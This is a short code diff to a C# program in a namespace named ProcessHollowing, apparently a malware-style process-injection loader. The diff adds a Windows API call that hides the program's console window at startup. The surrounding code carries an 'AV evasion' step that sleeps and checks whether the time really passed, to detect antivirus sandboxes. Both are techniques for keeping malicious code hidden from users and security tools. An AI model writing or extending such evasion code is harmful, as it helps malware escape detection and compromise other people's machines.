@@ -53,6 +53,9 @@ namespace ProcessHollowing
 
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
+        
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
@@ -75,6 +78,11 @@ namespace ProcessHollowing
 
         public static void Main(string[] args)
         {
+            // hide the window
+            IntPtr hide = Process.GetCurrentProcess().MainWindowHandle;
+            ShowWindow(hide, 0);
+            
+            
             // AV evasion: Sleep for 10s and detect if time really passed
             DateTime t1 = DateTime.Now;
             Sleep(10000);
